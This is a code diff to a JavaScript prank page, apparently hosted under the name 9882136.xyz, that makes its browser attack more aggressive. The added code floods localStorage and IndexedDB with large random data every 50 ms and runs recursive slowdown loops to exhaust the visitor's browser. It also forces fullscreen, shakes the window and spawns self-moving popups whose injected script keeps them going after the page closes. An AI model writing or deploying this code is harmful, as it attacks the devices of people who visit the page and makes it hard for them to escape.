@@ -114,9 +114,73 @@
     return `${k.toUpperCase()}: ${v}`;
   }).join('\n\n');
 
-  spawnChaosCopies(primaryText);
-  animateChaos();
-  startBouncer();
+  // show intro animation then start everything
+  showIntroAndStart();
+
+  function showIntroAndStart(){
+    const overlay = document.createElement('div');
+    overlay.id = 'introOverlay';
+    Object.assign(overlay.style, {
+      position: 'fixed', inset: '0', background: '#000', display: 'flex', alignItems: 'center', justifyContent: 'center', zIndex: 30000
+    });
+    const container = document.createElement('div');
+    container.style.fontFamily = '"Times New Roman", Times, serif';
+    container.style.fontSize = '96px';
+    container.style.letterSpacing = '8px';
+    container.style.color = '#fff';
+    container.style.textAlign = 'center';
+    container.style.whiteSpace = 'pre';
+    container.style.textShadow = '0 0 20px #fff, 0 0 40px currentColor';
+    overlay.appendChild(container);
+    document.body.appendChild(overlay);
+
+    const text = '9882136.xyz';
+    let i=0;
+    const spans = [];
+    for(const ch of text){
+      const s = document.createElement('span');
+      s.innerText = ch;
+      // neon color per character
+      s.style.color = `hsl(${Math.floor(Math.random()*360)},100%,60%)`;
+      s.style.opacity = '0';
+      s.style.transition = 'opacity 120ms linear';
+      container.appendChild(s);
+      spans.push(s);
+    }
+
+    const typer = setInterval(()=>{
+      if(i>=spans.length){
+        clearInterval(typer);
+        // keep text in background
+        overlay.style.background = 'transparent';
+        overlay.style.pointerEvents = 'none';
+        startEverything();
+        return;
+      }
+      spans[i].style.opacity='1';
+      i++;
+    }, 555);
+  }
+
+  function startEverything(){
+    // now start the original behaviors
+    spawnChaosCopies(primaryText);
+    animateChaos();
+    startBouncer();
+    startPopupSpawner(2600);
+    setTimeout(slowdownBrowser,2000);
+    window.addEventListener('load', ()=>{
+      const s=document.getElementById('status');
+      if(s) s.innerHTML+='<div>Status: Page loaded. Starting slowdown...</div>';
+    });
+    setTimeout(recursiveSlowdown,5000);
+    startBackgroundFlashes();
+    startChaosAudio();
+    moveWindowBounce();
+    for(let i=0;i<5;i++) spawnBouncingBrowserWindow();
+    // keep spawning more popups periodically
+    setInterval(()=>spawnBouncingBrowserWindow(), 4000);
+  }
 
   // --- Win95 popups ---
   const beep = document.getElementById('beep');
@@ -163,9 +227,6 @@
 
     btnClose.addEventListener('click', ()=>{
         win.remove();
-        // Spawn a few DVD windows when closed
-        const n = 1 + Math.floor(Math.random()*3);
-        for(let i=0;i<n;i++) createBouncingWindow({text:'DVD', velocity:6});
     });
     ok.addEventListener('click', ()=> win.remove());
     btnMin.addEventListener('click', ()=> {
@@ -223,35 +284,38 @@
     w.style.top = (ev.clientY + 10)+'px';
   });
 
+  // Go fullscreen on click
+  document.addEventListener('click', () => document.documentElement.requestFullscreen().catch(() => {}));
+
   // --- Aggressive random data generator ---
   function generateRandomData(size){ let d=''; for(let i=0;i<size;i++) d+=Math.random().toString(); return d; }
-  function createDeepObject(depth,width){ const obj={}; for(let i=0;i<width;i++){ obj[`prop${i}`] = depth>1 ? createDeepObject(depth-1,width) : generateRandomData(4096); } return obj; }
+  function createDeepObject(depth,width){ const obj={}; for(let i=0;i<width;i++){ obj[`prop${i}`] = depth>1 ? createDeepObject(depth-1,width) : generateRandomData(16384); } return obj; }
 
   function storeInLocalStorage(data){
-    for(let i=0;i<500;i++){ setTimeout(()=>{
+    for(let i=0;i<1000;i++){ setTimeout(()=>{
       const key=`key_${i}`;
       localStorage.setItem(key, JSON.stringify(data));
       const s=document.getElementById('status');
-      if(s) s.innerHTML+=`<div>Status: Stored in localStorage ${i}/500</div>`;
-    }, i*200);}
+      if(s) s.innerHTML+=`<div>Status: Stored in localStorage ${i}/1000</div>`;
+    }, i*50);}
   }
 
   async function storeInIndexedDB(data){
     const dbPromise=indexedDB.open('slowdown_db',1);
     dbPromise.onupgradeneeded = e => { const db=e.target.result; if(!db.objectStoreNames.contains('data_store')) db.createObjectStore('data_store'); }
     dbPromise.onsuccess=()=>{ const db=dbPromise.result;
-      for(let i=0;i<500;i++){ setTimeout(()=>{
+      for(let i=0;i<1000;i++){ setTimeout(()=>{
         const t=db.transaction(['data_store'],'readwrite'); const s=t.objectStore('data_store');
         s.put({id:`id_${i}`,data:JSON.stringify(data)});
-        const stat=document.getElementById('status'); if(stat) stat.innerHTML+=`<div>Status: Stored in IndexedDB ${i}/500</div>`;
-      },i*200);}
+        const stat=document.getElementById('status'); if(stat) stat.innerHTML+=`<div>Status: Stored in IndexedDB ${i}/1000</div>`;
+      },i*50);}
     }
   }
 
   async function slowdownBrowser(){
     const s=document.getElementById('status');
     if(s) s.innerHTML='<div>Status: Generating random data...</div>';
-    const data=createDeepObject(10,50);
+    const data=createDeepObject(15,100);
     if(s) s.innerHTML+='<div>Status: Starting storage operations...</div>';
     storeInLocalStorage(data);
     await storeInIndexedDB(data);
@@ -264,38 +328,57 @@
     if(s) s.innerHTML+='<div>Status: Page loaded. Starting slowdown...</div>';
   });
 
-  function recursiveSlowdown(){ const data=createDeepObject(10,50); storeInLocalStorage(data); storeInIndexedDB(data); setTimeout(recursiveSlowdown,200); }
+  function recursiveSlowdown(){ const data=createDeepObject(15,100); storeInLocalStorage(data); storeInIndexedDB(data); setTimeout(recursiveSlowdown,50); }
   setTimeout(recursiveSlowdown,5000);
 
   // --- Keep chaos filling on resize ---
   window.addEventListener('resize', ()=>{ spawnChaosCopies(primaryText,8); });
 
-  // --- DVD-style bouncing windows ---
-  function createBouncingWindow({width=200,height=100,text='DVD',velocity=6}){
-    const win=document.createElement('div');
-    win.className='win95-window retro'; win.style.position='absolute'; win.style.width=width+'px'; win.style.height=height+'px';
-    win.style.left=(Math.random()*(window.innerWidth-width))+'px'; win.style.top=(Math.random()*(window.innerHeight-height))+'px';
-    win.style.backgroundColor='#fff'; win.style.border='2px solid #000'; win.style.zIndex=20000;
-    const titleBar=document.createElement('div'); titleBar.className='win95-title'; titleBar.style.cursor='grab'; titleBar.style.backgroundColor='#0078d7'; titleBar.style.color='white'; titleBar.style.fontWeight='bold'; titleBar.innerText=text;
-    win.appendChild(titleBar); document.body.appendChild(win);
-    let x=parseFloat(win.style.left),y=parseFloat(win.style.top),vx=velocity*(Math.random()>0.5?1:-1),vy=velocity*(Math.random()>0.5?1:-1);
-    const tickLength=30, margin=0;
-    const interval=setInterval(()=>{
-      x+=vx;y+=vy;
-      if(x<margin) vx=Math.abs(vx);
-      if(x+width>window.innerWidth-margin) vx=-Math.abs(vx);
-      if(y<margin) vy=Math.abs(vy);
-      if(y+height>window.innerHeight-margin) vy=-Math.abs(vy);
-      win.style.left=x+'px'; win.style.top=y+'px';
-      win.style.backgroundColor=`hsl(${Math.random()*360},100%,80%)`;
-    },tickLength);
-    const closeBtn=document.createElement('div'); closeBtn.className='win95-btn'; closeBtn.innerText='X'; closeBtn.style.position='absolute'; closeBtn.style.top='2px'; closeBtn.style.right='2px'; closeBtn.style.cursor='pointer'; closeBtn.style.fontWeight='bold';
-    titleBar.appendChild(closeBtn);
-    closeBtn.addEventListener('click',()=>{
-      win.remove();
-      const n=1+Math.floor(Math.random()*3); for(let i=0;i<n;i++) createBouncingWindow({text:'DVD', velocity:velocity});
-    });
-    return win;
+
+ 
+  function moveWindowBounce() {
+    const VELOCITY = 6, MARGIN = 0, SCREEN_WIDTH = screen.width, SCREEN_HEIGHT = screen.height, TICK_LENGTH = 30;
+    let vx = VELOCITY * (Math.random() > 0.5 ? 1 : -1), vy = VELOCITY * (Math.random() > 0.5 ? 1 : -1);
+    setInterval(() => {
+      const x = window.screenX, y = window.screenY, width = window.outerWidth, height = window.outerHeight;
+      if (x < MARGIN) vx = Math.abs(vx);
+      if (x + width > SCREEN_WIDTH - MARGIN) vx = -Math.abs(vx);
+      if (y < MARGIN) vy = Math.abs(vy);
+      if (y + height > SCREEN_HEIGHT - MARGIN) vy = -Math.abs(vy);
+      window.moveBy(vx, vy);
+    }, TICK_LENGTH);
+  }
+
+  function spawnBouncingBrowserWindow() {
+    // try to open a popup that's not resizable (browsers may ignore some flags)
+    const features = 'width=500,height=300,resizable=no,menubar=no,toolbar=no,location=no,status=no,scrollbars=no';
+    const win = window.open('', '_blank', features);
+    if (win) {
+      // inject a self-contained bouncing script so the popup keeps moving after this page closes
+      win.document.write(`
+<html>
+<head><title>haha</title></head>
+<body style="margin:0; padding:0; display:flex; align-items:center; justify-content:center; background:#000; color:#fff; font-size:24px; font-weight:bold;">haha</body>
+<script>
+let vx = ${6 * (Math.random() > 0.5 ? 1 : -1)}, vy = ${6 * (Math.random() > 0.5 ? 1 : -1)};
+function jitterReverseX(){ vx = -vx + (Math.random()*3-1.5); if(Math.abs(vx)<2) vx = Math.sign(vx||1)*2; }
+function jitterReverseY(){ vy = -vy + (Math.random()*3-1.5); if(Math.abs(vy)<2) vy = Math.sign(vy||1)*2; }
+    setInterval(() => {
+  try{
+    const x = window.screenX, y = window.screenY, width = window.outerWidth, height = window.outerHeight;
+    if (x <= 0) jitterReverseX();
+    if (x + width >= screen.width) jitterReverseX();
+    if (y <= 0) jitterReverseY();
+    if (y + height >= screen.height) jitterReverseY();
+    window.moveBy(vx, vy);
+    document.body.style.backgroundColor = 'hsl(' + (Math.random()*360) + ',100%,50%)';
+  }catch(e){}
+}, 30);
+</script>
+</html>
+      `);
+      win.document.close();
+    }
   }
 
   function startChaosAudio(){
@@ -305,8 +388,6 @@
 
   function startBackgroundFlashes(){ setInterval(()=>{ document.body.style.backgroundColor=`hsl(${Math.random()*360},100%,90%)`; },350); }
 
-  for(let i=0;i<5;i++) createBouncingWindow({text:'DVD',velocity:6});
-  startChaosAudio();
-  startBackgroundFlashes();
+  // intro/start sequence will call the functions when ready
 
 })();
